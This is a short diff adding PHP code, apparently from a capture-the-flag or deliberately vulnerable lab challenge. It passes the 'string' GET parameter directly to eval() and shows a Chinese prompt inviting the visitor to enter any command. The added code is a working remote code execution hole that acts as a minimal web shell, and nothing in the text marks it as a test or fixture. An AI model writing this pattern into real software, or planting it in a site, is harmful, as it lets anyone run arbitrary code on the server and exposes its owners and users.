@@ -1,0 +1,6 @@
+$str = $_GET['string'];
+
+$eval = eval($str.';');
+if(!$eval){
+    $html = "要不~，随便输一个命令~";
+}
